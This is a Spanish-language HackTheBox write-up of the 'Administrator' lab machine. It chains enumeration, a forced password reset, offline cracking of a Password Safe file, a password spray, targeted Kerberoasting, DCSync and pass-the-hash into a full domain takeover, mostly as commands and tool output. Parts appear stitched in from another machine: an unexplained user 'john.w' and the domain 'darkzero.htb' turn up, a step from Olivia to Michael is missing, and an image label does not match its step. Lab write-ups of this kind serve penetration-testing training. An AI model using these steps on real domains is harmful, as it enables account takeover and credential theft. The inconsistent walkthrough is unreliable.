---
title: "HTB: Administrator"
date: 2026-04-01 12:00:00 +0000
categories: [WriteUp, HackTheBox]
tags: [Active Directory, Windows, DCSync, Kerberoasting, Bloodhound]
image:
  path: /assets/img/Administrator/Administrator-HTB.png
  alt: HackTheBox Administrator Machine
  width: 500
  height: 280
  class: sz-contain
---

## Introducción
En esta máquina de Active Directory, explotaremos una cadena de permisos ACL mal configurados, abusaremos de un servicio FTP para obtener una base de datos de contraseñas y finalmente comprometeremos el dominio mediante un ataque de DCSync.


## Reconocimiento

### Comprobación de conectividad
Se enviará una solicitud de ICMP (ping) para comprobar que la máquina objetivo se encuentra activa y accesible.

```bash
lexo@lexo0x00 ~/htb/administrator> ping -c 1 10.129.12.39
PING 10.129.12.39 (10.129.12.39) 56(84) bytes of data.
64 bytes from 10.129.12.39: icmp_seq=1 ttl=127 time=102 ms
```

### Escaneo de Puertos (Port Scanning)
Se ejecutará un escaneo de puertos con **Rustscan** para identificar los servicios expuestos en la máquina objetivo.

```bash
rustscan -a 10.129.12.39 --ulimit 1000 -r 1-65535 -- -A -sC -sV -Pn -o nmapresult.txt
```

**Output del escaneo:**

```text
PORT      STATE SERVICE       REASON  VERSION
21/tcp    open  ftp           syn-ack Microsoft ftpd
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds? syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Análisis del escaneo
- **Active Directory:** Los puertos habituales (DNS, Kerberos, LDAP y SMB) se encuentran abiertos, lo cual es normal en un entorno de dominio.
- **Firma SMB:** La firma obligatoria en SMB está habilitada, lo que evita ataques de retransmisión NTLM.
- **FTP:** El puerto 21 está abierto y ejecuta un servicio de FTP posiblemente mal configurado.
- **Desfase horario:** Se detectó una diferencia de hora crítica para ataques Kerberos.

## Enumeración inicial (NXC)

Reutilizaremos las credenciales filtradas para realizar una enumeración autenticada.

### Enumeración de usuarios
```bash
nxc smb 10.129.12.39 -u 'Olivia' -p 'ichliebedich' --users
```

**Output:**

```
SMB         10.129.12.39    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.12.39    445    DC               [+] administrator.htb\Olivia:ichliebedich 
SMB         10.129.12.39    445    DC               -Username-                -Last PW Set-        -BadPW- -Description-
SMB         10.129.12.39    445    DC               Administrator             2024-10-22 18:59:36 0       Built-in account for administering the computer/domain
SMB         10.129.12.39    445    DC               Guest                     <never>              0       Built-in account for guest access to the computer/domain
SMB         10.129.12.39    445    DC               krbtgt                    2024-10-04 19:53:28 0       Key Distribution Center Service Account
SMB         10.129.12.39    445    DC               olivia                    2024-10-06 01:22:48 0       
SMB         10.129.12.39    445    DC               michael                   2024-10-06 01:33:37 0       
SMB         10.129.12.39    445    DC               benjamin                  2024-10-06 01:34:56 0       
SMB         10.129.12.39    445    DC               emily                     2024-10-30 23:40:02 0       
SMB         10.129.12.39    445    DC               ethan                     2024-10-12 20:52:14 0       
SMB         10.129.12.39    445    DC               alexander                 2024-10-31 00:18:04 0       
SMB         10.129.12.39    445    DC               emma                      2024-10-31 00:18:35 0       
SMB         10.129.12.39    445    DC               [*] Enumerated 10 local users: ADMINISTRATOR
```

### Enumeración de grupos LDAP
```bash
nxc ldap 10.129.12.39 -u 'Olivia' -p 'ichliebedich' --groups
```

**Output:**

```
LDAP        10.129.12.39    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.12.39    389    DC               [+] administrator.htb\Olivia:ichliebedich 
LDAP        10.129.12.39    389    DC               -Group-                           -Members- -Description-                                                                  
LDAP        10.129.12.39    389    DC               Administrators                    3         Administrators have complete and unrestricted access to the computer/domain    
LDAP        10.129.12.39    389    DC               Users                             3         Users are prevented from making accidental or intentional system-wide changes and can run most applications
LDAP        10.129.12.39    389    DC               Guests                            2         Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
LDAP        10.129.12.39    389    DC               Print Operators                   0         Members can administer printers installed on domain controllers                
LDAP        10.129.12.39    389    DC               Backup Operators                  0         Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
LDAP        10.129.12.39    389    DC               Replicator                        0         Supports file replication in a domain                                          
LDAP        10.129.12.39    389    DC               Remote Desktop Users              0         Members in this group are granted the right to logon remotely                  
LDAP        10.129.12.39    389    DC               Network Configuration Operators   0         Members in this group can have some administrative privileges to manage configuration of networking features
LDAP        10.129.12.39    389    DC               Performance Monitor Users         0         Members of this group can access performance counter data locally and remotely 
LDAP        10.129.12.39    389    DC               Performance Log Users             0         Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
LDAP        10.129.12.39    389    DC               Distributed COM Users             0         Members are allowed to launch, activate and use Distributed COM objects on this machine.
LDAP        10.129.12.39    389    DC               IIS_IUSRS                         0         Built-in group used by Internet Information Services.                          
LDAP        10.129.12.39    389    DC               Cryptographic Operators           0         Members are authorized to perform cryptographic operations.                    
LDAP        10.129.12.39    389    DC               Event Log Readers                 0         Members of this group can read event logs from local machine                   
LDAP        10.129.12.39    389    DC               Certificate Service DCOM Access   0         Members of this group are allowed to connect to Certification Authorities in the enterprise
LDAP        10.129.12.39    389    DC               RDS Remote Access Servers         0         Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.
LDAP        10.129.12.39    389    DC               RDS Endpoint Servers              0         Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.
LDAP        10.129.12.39    389    DC               RDS Management Servers            0         Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.
LDAP        10.129.12.39    389    DC               Hyper-V Administrators            0         Members of this group have complete and unrestricted access to all features of Hyper-V.
```

Se identificó al usuario `john.w` con permisos de lectura especiales sobre recursos compartidos predeterminados.

## Análisis de Dominio - Bloodhound

Utilizaremos las credenciales obtenidas para recopilar información del dominio.

```bash
bloodhound-ce-python -u 'john.w' -p 'RFulUtONCOL!' -d darkzero.htb -ns 10.129.12.39 -c All --zip
```

### Abuso de ACL: ForceChangePassword
Detectamos que el usuario `Michael` tiene el permiso `ForceChangePassword` sobre `Benjamin`, lo que significa que puede resetear su contraseña.

![GenericAll](/assets/img/genericall.png)

**Command:**

```powershell
$NewPass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity benjamin -AccountPassword $NewPass
```

El usuario `Benjamin` pertenece al grupo **Share Moderator**, posiblemente relacionado con el servicio FTP.

## Acceso FTP y Cracking

Accedemos al FTP con la nueva contraseña de Benjamin:

```bash
lexo@lexo0x00 > ftp 10.129.12.39
Name: benjamin
Password: Password123!
ftp> ls
10-05-24  09:13AM                  952 Backup.psafe3
ftp> get Backup.psafe3
```

### Crackeando la base de datos Password Safe
Utilizamos **Hashcat** para obtener la llave maestra del archivo `.psafe3`.

```bash
hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```
**Resultado:** `tekieromucho`

Al acceder a la base de datos, extraemos las credenciales de los usuarios `alexander`, `emily` y `emma`.

## Movimiento Lateral: Password Spray

Ejecutamos un ataque de Password Spray con las credenciales obtenidas:

```bash
nxc winrm 10.129.12.39 -u users.txt -p passwords.txt
```
**Resultado:** `[+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)`

Accedemos mediante **Evil-WinRM**:
```bash
evil-winrm -i 10.129.12.39 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

## Escalada de Privilegios

### GenericWrite y Targeted Kerberoasting
Emily posee el permiso `GenericWrite`, lo que nos permite modificar atributos para realizar Kerberoasting sobre otros usuarios.

![GenericWrite](/assets/img/2.png)

**Command:**

```bash
python3 targetedKerberoast.py --dc-ip 10.129.12.39 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```
Obtenemos el hash de `ethan` y lo crackeamos:
```bash
hashcat -a 0 -m 13100 ethan_hash.txt /usr/share/wordlists/rockyou.txt
```
**Password:** `limpbizkit`

### Post-Explotación: DCSync
Ethan tiene privilegios de replicación de directorio. Utilizamos `secretsdump.py` para realizar un ataque de **DCSync**:

![DCSYnc](/assets/img/dcsync.png)

**Command:**

```bash
secretsdump.py -just-dc administrator.htb/ethan:limpbizkit@10.129.12.39
```

**NT Hash obtenido (Administrator):** `3dc553ce4b9fd20bd016e098d2d2fd2e`

## Acceso Final (System)

Finalmente, entramos como Administrador del Dominio usando Pass-The-Hash:

```bash
evil-winrm -i 10.129.12.39 -u 'Administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
```

¡Máquina comprometida con éxito!
c